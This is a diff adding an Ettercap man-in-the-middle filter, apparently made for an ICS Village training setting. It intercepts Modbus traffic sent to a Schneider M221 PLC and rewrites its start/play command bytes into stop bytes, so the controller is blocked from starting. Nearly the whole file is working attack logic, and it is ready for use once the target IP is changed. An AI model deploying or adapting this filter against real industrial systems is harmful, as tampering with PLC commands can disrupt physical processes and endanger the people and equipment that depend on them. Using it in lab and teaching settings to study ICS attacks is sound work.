@@ -1,0 +1,29 @@
+###########################################
+# Name: M221-prevent-start.filter
+# Description: ICS Village Ettercap Filter 
+#              for preventing M221 Modbus 
+#              start message by modifying
+#              it to a stop message.
+# Created by: Don C. Weber (@cutaway)
+# Date Created: January 2021
+# Version: 0.1
+###########################################
+
+# Checking to see if the source is the PLC and the protocol is Modbus
+# Note: The IP address will need to be updated for your PLC
+if (ip.dst == '192.168.0.21' && tcp.dst == 502) {
+    
+    # SE Modbus Notes
+    ## \x5a is the SE Modbus Function Indicator at byte 7
+    ## The next byte changes every time there is a login via SE software
+    ## Three bytes starting at byte 9 are the play / stop command bytes
+
+	# Test for Play Modbus Message. 
+    if (DATA.data + 9 == "\x40\xff\x00") {
+        # Modify first byte to be the stop byte \x41
+    	DATA.data + 9 = "\x41\xff\x00";
+    	# Printing a message when the filter fires.
+    	msg("Data.data + 9 is \x40\xff\x00");
+    }
+}
+
